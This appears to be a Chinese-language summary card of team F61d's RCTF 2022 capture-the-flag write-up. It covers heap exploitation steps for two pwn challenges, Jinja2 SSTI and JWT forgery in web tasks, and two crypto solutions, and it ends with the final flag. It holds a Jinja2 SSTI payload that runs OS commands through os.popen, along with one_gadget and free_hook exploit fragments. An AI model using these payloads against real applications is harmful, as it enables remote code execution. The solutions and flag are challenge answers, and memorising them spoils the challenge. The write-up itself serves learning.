---
title: "RCTF 2022 WriteUp By F61d"
category: misc
tags: ["RCTF 2022", "misc", "pwn", "heap-encrypt", "free-hook", "bank-system"]
signals: ["RCTF 2022 2022", "pwn", "heap-encrypt", "free-hook", "bank-system", "ssti", "file-upload", "jwt", "scoreboard", "misc_unknown", "RCTF", "F61d", "PWN", "diary"]
difficulty: hard
source: "https://www.ctfiot.com/85535.html"
tools: ["Jinja2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# RCTF 2022 WriteUp By F61d

> 赛事：RCTF 2022 2022 | 方向：misc | 难度：hard | 工具：Jinja2

## 一句话总结

RCTF 2022 F61d 全方向多题 WP：PWN (diary encrypt 错位 fake chunk / bank free_hook 8 次 add)、Web (Jinja2 SSTI 文件上传 / JWT 伪造)、Crypto (AES 改 base64 字母表 / RC4 已知密钥)。

## 攻击链

1. PWN diary: encrypt/decrypt heap feng shui + 错位引用触发 fake chunk 利用
2. add(0, '1'*0x2f0) + encrypt(0, 4, 8) 写 8 字节加密 key 复用 show 泄 key
3. key ^ 0x3131313131313131 = random0
4. 12 个 add 触发 unsorted bin + 6 个 delete 触发 tcache 复用
5. edit(0, p64(freehook-0x2ec)) + encrypt(0,4,0x6) 错位 0x6 字节加密触发 fake chunk
6. add(0x21, 'a'*0x2e8+p64(ogg)) 写入 ogg=libcbase+0xe3b01 one_gadget
7. PWN bank: free_hook + update_passwd 写入 free_hook-0x10
8. 8 次 add + exit_count 触发 __malloc_hook 钩子 → system
9. Web upload SSTI: 上传文件含 #!/{{config.__class__.__init__.__globals__[''os''].popen(''ls'').read()}} 触发 Jinja2 SSTI
10. 文件保存到 /upload/f61d.php 执行后读 flag
11. Web scoreboard: ''scoreboard'' + && + SmlZPQ== base64 = ''alien game'' JWT
12. Crypto AES 改 base64 字母表: table1=''ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'' vs table2=''+/EFGHIJ...
13. Crypto RC4 key='Welc0me to RCTF 2O22' 解密 42 字节密文
14. flag: RCTF{Si13nc3_15_nEvEr_9ivin9_up_&&_6ut_h01din9_On_Si13nT1y}

## 关键 payload

```
encrypt(0,4,0x6) 错位 0x6 字节加密触发 fake chunk + p64(ogg=libcbase+0xe3b01) + a'*0x2e8
```

## 经验教训

encrypt 错位字节是 heap 漏洞挖法 (错位写 fake chunk size 触发后续利用)；Jinja2 SSTI 经典 shebang 注入 #!/{{...}} 是 webshell 入口；AES 改 base64 字母表 + 错位 base58 是 crypto 入门题。

## 标签

pwn、heap-encrypt、free-hook、bank-system、ssti、file-upload、jwt、scoreboard、crypto-rc4、crypto-aes-table

## 参考来源

- https://www.ctfiot.com/85535.html
- 原文件：RCTF_2022_WriteUp_By_F61d.full.md
